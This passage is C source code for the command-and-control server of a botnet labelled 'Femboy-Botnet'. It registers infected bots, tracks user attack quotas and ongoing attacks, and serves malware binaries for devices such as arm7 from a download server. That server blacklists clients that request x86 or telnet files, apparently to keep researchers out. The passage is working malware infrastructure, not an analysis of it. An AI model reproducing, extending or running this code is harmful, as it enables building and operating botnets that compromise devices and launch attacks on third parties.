        handle_bot_connection(session);
    } else {
        pthread_mutex_lock(&conn_mutex);
        active_connections--;
        pthread_mutex_unlock(&conn_mutex);
    }
    
    return NULL;
}

void* handle_connection(void* param) {
    int client_sock = *(int*)param;
    free(param);
    
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    getpeername(client_sock, (struct sockaddr*)&client_addr, &addr_len);
    char* client_ip = inet_ntoa(client_addr.sin_addr);
    
    ClientSession* session = (ClientSession*)malloc(sizeof(ClientSession));
    session->socket = client_sock;
    strcpy(session->ip, client_ip);
    session->is_bot = 0;
    session->authenticated = 0;
    session->active = 0;
    session->vip = 0;
    session->admin = 0;
    session->max_attacks = 0;
    session->current_attacks = 0;
    session->last_attack = 0;
    session->user_info = NULL;
    
    pthread_mutex_lock(&conn_mutex);
    if (active_connections >= MAX_CONNECTIONS) {
        close(client_sock);
        free(session);
        pthread_mutex_unlock(&conn_mutex);
        return NULL;
    }
    active_connections++;
    pthread_mutex_unlock(&conn_mutex);
    
    if (!authenticate_client(session)) {
        pthread_mutex_lock(&conn_mutex);
        active_connections--;
        pthread_mutex_unlock(&conn_mutex);
        return NULL;
    }
    
    pthread_mutex_lock(&online_mutex);
    online_users++;
    pthread_mutex_unlock(&online_mutex);
    
    handle_user_connection(session);
    
    pthread_mutex_lock(&online_mutex);
    online_users--;
    pthread_mutex_unlock(&online_mutex);
    
    return NULL;
}

void* gif_server(void* param) {
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(GIF_PORT);
    
    int reuse = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("GIF server bind failed");
        close(server_socket);
        return NULL;
    }
    
    listen(server_socket, 1000);
    printf("GIF server running on port %d...\n", GIF_PORT);
    
    while (1) {
        int client_socket = accept(server_socket, NULL, NULL);
        if (client_socket >= 0) {
            char request_buffer[BUFFER_SIZE];
            int bytes_received = recv(client_socket, request_buffer, BUFFER_SIZE - 1, 0);
            
            if (bytes_received > 0) {
                request_buffer[bytes_received] = '\0';
                
                if (strstr(request_buffer, "GET /gifs/") != NULL) {
                    char* filename_start = strstr(request_buffer, "/gifs/") + 6;
                    char* filename_end = strchr(filename_start, ' ');
                    if (filename_end) {
                        *filename_end = '\0';
                        
                        char filepath[256];
                        snprintf(filepath, sizeof(filepath), "gifs/%s.tfx", filename_start);
                        
                        FILE* file = fopen(filepath, "r");
                        if (file) {
                            fseek(file, 0, SEEK_END);
                            long file_size = ftell(file);
                            fseek(file, 0, SEEK_SET);
                            
                            char response_header[512];
                            snprintf(response_header, sizeof(response_header),
                                "HTTP/1.1 200 OK\r\n"
                                "Content-Type: text/plain\r\n"
                                "Content-Length: %ld\r\n"
                                "Connection: close\r\n"
                                "\r\n", file_size);
                            
                            send(client_socket, response_header, strlen(response_header), 0);
                            
                            char buffer[8192];
                            size_t bytes_read;
                            while ((bytes_read = fread(buffer, 1, sizeof(buffer), file)) > 0) {
                                send(client_socket, buffer, bytes_read, 0);
                            }
                            fclose(file);
                        } else {
                            char response[] = "HTTP/1.1 404 Not Found\r\nContent-Length: 13\r\n\r\nGIF not found";
                            send(client_socket, response, strlen(response), 0);
                        }
                    }
                } else {
                    char response[] = "HTTP/1.1 400 Bad Request\r\nContent-Length: 15\r\n\r\nInvalid request";
                    send(client_socket, response, strlen(response), 0);
                }
            }
            
            close(client_socket);
        }
    }
    
    close(server_socket);
    return NULL;
}

void* bot_port_server(void* param) {
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(BOT_PORT);
    
    int reuse = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bot port bind failed");
        close(server_socket);
        return NULL;
    }
    
    listen(server_socket, 1000);
    
    printf("Bot registration server running on port %d...\n", BOT_PORT);
    
    while (1) {
        int client_socket = accept(server_socket, NULL, NULL);
        if (client_socket >= 0) {
            int* client_sock_ptr = malloc(sizeof(int));
            *client_sock_ptr = client_socket;
            
            pthread_t thread_id;
            pthread_create(&thread_id, NULL, handle_bot_port_connection, client_sock_ptr);
            pthread_detach(thread_id);
        }
    }
    
    close(server_socket);
    return NULL;
}

void* download_server(void* param) {
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("Download server socket failed");
        return NULL;
    }
    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(DOWNLOAD_PORT);
    
    int reuse = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    int flags = fcntl(server_socket, F_GETFL, 0);
    fcntl(server_socket, F_SETFL, flags | O_NONBLOCK);
    
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Download server bind failed");
        close(server_socket);
        return NULL;
    }
    
    if (listen(server_socket, 1000) < 0) {
        perror("Download server listen failed");
        close(server_socket);
        return NULL;
    }
    
    printf("Download server running on port %d...\n", DOWNLOAD_PORT);
    
    fd_set read_fds;
    struct timeval timeout;
    
    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(server_socket, &read_fds);
        
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        int activity = select(server_socket + 1, &read_fds, NULL, NULL, &timeout);
        
        if (activity < 0 && errno != EINTR) {
            perror("Download server select error");
            sleep(1);
            continue;
        }
        
        if (activity > 0 && FD_ISSET(server_socket, &read_fds)) {
            struct sockaddr_in client_addr;
            socklen_t client_len = sizeof(client_addr);
            int client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
            
            if (client_socket >= 0) {
                pthread_t thread_id;
                int* client_sock_ptr = malloc(sizeof(int));
                *client_sock_ptr = client_socket;
                memcpy(client_sock_ptr + 1, &client_addr, sizeof(client_addr));
                
                pthread_create(&thread_id, NULL, handle_download_client, client_sock_ptr);
                pthread_detach(thread_id);
            }
        }
        
        usleep(10000);
    }
    
    close(server_socket);
    return NULL;
}

void* handle_download_client(void* param) {
    int client_socket = *(int*)param;
    struct sockaddr_in client_addr = *(struct sockaddr_in*)((int*)param + 1);
    free(param);
    
    char client_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(client_addr.sin_addr), client_ip, INET_ADDRSTRLEN);
    
    struct timeval tv;
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    char request_buffer[BUFFER_SIZE];
    int bytes_received = recv(client_socket, request_buffer, BUFFER_SIZE - 1, 0);
    
    if (bytes_received <= 0) {
        close(client_socket);
        return NULL;
    }
    
    request_buffer[bytes_received] = '\0';
    
    if (is_ip_blacklisted(client_ip)) {
        char response[] = "HTTP/1.1 403 Forbidden\r\nContent-Length: 20\r\n\r\nAccess Denied - IP Blacklisted";
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        close(client_socket);
        return NULL;
    }
    
    char* requested_file = NULL;
    
    if (strstr(request_buffer, "GET /") != NULL) {
        char* path_start = strstr(request_buffer, "GET /") + 5;
        char* path_end = strchr(path_start, ' ');
        if (path_end) {
            *path_end = '\0';
            requested_file = path_start;
            
            printf("DEBUG: Download request from %s: %s\n", client_ip, requested_file);
            
            if (strncmp(requested_file, "bins/", 5) == 0) {
                char* actual_filename = requested_file + 5;
                char file_lower[256];
                strncpy(file_lower, actual_filename, sizeof(file_lower) - 1);
                file_lower[sizeof(file_lower) - 1] = '\0';
                
                for (int i = 0; file_lower[i]; i++) {
                    file_lower[i] = tolower(file_lower[i]);
                }
                
                if (strstr(file_lower, "x86_64") != NULL ||
                    strstr(file_lower, "x86_32") != NULL ||
                    strstr(file_lower, "telnet") != NULL) {
                    add_to_blacklist(client_ip);
                    char response[] = "HTTP/1.1 403 Forbidden\r\nContent-Length: 20\r\n\r\nAccess Denied - IP Blacklisted";
                    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
                    close(client_socket);
                    return NULL;
                }
            } else {
                add_to_blacklist(client_ip);
                char response[] = "HTTP/1.1 403 Forbidden\r\nContent-Length: 20\r\n\r\nAccess Denied - IP Blacklisted";
                send(client_socket, response, strlen(response), MSG_NOSIGNAL);
                close(client_socket);
                return NULL;
            }
        }
    }
    
    if (requested_file == NULL) {
        close(client_socket);
        return NULL;
    }
    
    struct stat file_stat;
    if (stat(requested_file, &file_stat) == 0) {
        char response[512];
        sprintf(response, 
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: application/octet-stream\r\n"
            "Content-Disposition: attachment; filename=\"%s\"\r\n"
            "Content-Length: %ld\r\n"
            "Connection: close\r\n"
            "\r\n", 
            strrchr(requested_file, '/') ? strrchr(requested_file, '/') + 1 : requested_file,
            file_stat.st_size);
        
        if (send(client_socket, response, strlen(response), MSG_NOSIGNAL) > 0) {
            FILE* file = fopen(requested_file, "rb");
            if (file) {
                char buffer[8192];
                size_t bytes_read;
                while ((bytes_read = fread(buffer, 1, sizeof(buffer), file)) > 0) {
                    int total_sent = 0;
                    while (total_sent < bytes_read) {
                        int sent = send(client_socket, buffer + total_sent, bytes_read - total_sent, MSG_NOSIGNAL);
                        if (sent <= 0) break;
                        total_sent += sent;
                    }
                    if (total_sent < bytes_read) break;
                }
                fclose(file);
            }
        }
    } else {
        char response[] = "HTTP/1.1 404 Not Found\r\nContent-Length: 13\r\n\r\nFile not found";
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    }
    
    close(client_socket);
    return NULL;
}

void* attack_cleanup_daemon(void* param) {
    while (1) {
        sleep(5);
        force_cleanup_attacks();
    }
    return NULL;
}

void* bot_cleanup_daemon(void* param) {
    while (1) {
        sleep(30);
        
        pthread_mutex_lock(&bot_mutex);
        
        int cleaned_count = 0;
        for (int i = 0; i < MAX_BOTS; i++) {
            if (connected_bots[i] != NULL && connected_bots[i]->is_bot) {
                char buffer[1];
                ssize_t result = recv(connected_bots[i]->socket, buffer, 1, MSG_PEEK | MSG_DONTWAIT);
                
                if (result == 0 || (result == -1 && errno != EAGAIN && errno != EWOULDBLOCK)) {
                    printf("Cleaning up dead bot: %s (%s/%s/%s)\n", 
                           connected_bots[i]->ip, 
                           connected_bots[i]->architecture,
                           connected_bots[i]->platform,
                           connected_bots[i]->device_type);
                    
                    close(connected_bots[i]->socket);
                    free(connected_bots[i]);
                    connected_bots[i] = NULL;
                    bot_count--;
                    cleaned_count++;
                }
            }
        }
        
        if (cleaned_count > 0) {
            printf("Bot cleanup: removed %d dead connections\n", cleaned_count);
        }
        
        pthread_mutex_unlock(&bot_mutex);
    }
    return NULL;
}

void* download_server_monitor(void* param) {
    while (1) {
        sleep(30);
        
        static time_t last_activity = 0;
        static int restart_count = 0;
        
        FILE* test_file = fopen("bins/arm7", "rb");
        if (test_file) {
            last_activity = time(NULL);
            fclose(test_file);
        } else {
            if (time(NULL) - last_activity > 60) {
                printf("Download server appears stuck - monitoring...\n");
                restart_count++;
                
                if (restart_count > 3) {
                    printf("Restarting download server...\n");
                    pthread_t download_thread;
                    pthread_create(&download_thread, NULL, download_server, NULL);
                    pthread_detach(download_thread);
                    restart_count = 0;
                }
            }
        }
    }
    return NULL;
}

int main() {
    ignore_sigpipe();
    
    int server_socket, client_socket;
    int keepalive = 1;
    int nodelay = 1;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);
    char server_ip[16];
    
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);
    
    int reuse = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    setsockopt(server_socket, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive));
    setsockopt(server_socket, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));
    
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(server_socket);
        return 1;
    }
    listen(server_socket, 1000);
    
    memset(connected_bots, 0, sizeof(connected_bots));
    memset(ongoing_attacks, 0, sizeof(ongoing_attacks));
    load_database();

    get_server_ip(server_ip);
    printf("\x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \033[0m\n");
    printf("\x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \x1b[1;32;42m \033[0m\n");
    printf("\x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \033[0m\n");
    printf("\x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \x1b[1;97;107m \033[0m\n");
    printf("\x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \033[0m\n");
    printf("\x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \x1b[1;31;41m \033[0m\n");
    printf("\033[32mBrandings Loaded\033[0m\n");
    printf("\033[32mBlackList Loaded\033[0m\n");
    printf("\033[32mWhitelist Loaded\033[0m\n");
    printf("\033[32mFemboy-Botnet Loaded\033[0m\n");
    printf("Server IP: %s\n", server_ip);
    printf("User Port: %d\n", PORT);
    printf("Bot Port: %d\n", BOT_PORT);
    printf("Download Port: %d\n", DOWNLOAD_PORT);
    printf("API Port: %d\n", API_PORT);
    printf("Duplicate Bot Detection: %s\033[0m\n", 
           DUPLICATE_BOT_DETECTION ? "\033[32mEnabled" : "\033[31mDisabled");
    printf("Femboy Server running on port %d...\n", PORT);
    
    mkdir("logs", 0755);
    mkdir("branding", 0755);
    mkdir("blacklist", 0755);
    mkdir("whitelist", 0755);
    
    pthread_t download_thread;
    pthread_create(&download_thread, NULL, download_server, NULL);
    pthread_detach(download_thread);
    
    pthread_t api_thread;
    pthread_create(&api_thread, NULL, api_server, NULL);
    pthread_detach(api_thread);

    pthread_t bot_port_thread;
    pthread_create(&bot_port_thread, NULL, bot_port_server, NULL);
    pthread_detach(bot_port_thread);
    
    pthread_t gif_thread;
    pthread_create(&gif_thread, NULL, gif_server, NULL);
    pthread_detach(gif_thread);
    
    pthread_t cleanup_thread;
    pthread_create(&cleanup_thread, NULL, attack_cleanup_daemon, NULL);
    pthread_detach(cleanup_thread);
    
    pthread_t bot_cleanup_thread;
    pthread_create(&bot_cleanup_thread, NULL, bot_cleanup_daemon, NULL);
    pthread_detach(bot_cleanup_thread);

    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, download_server_monitor, NULL);
    pthread_detach(monitor_thread);
    
    while (1) {
        client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &addr_len);
        if (client_socket >= 0) {
            int* client_sock_ptr = malloc(sizeof(int));
            *client_sock_ptr = client_socket;
            
            pthread_t thread_id;
            pthread_create(&thread_id, NULL, handle_connection, client_sock_ptr);
            pthread_detach(thread_id);
        }
    }
    
    close(server_socket);
    return 0;
}
// * Femboy-Botnet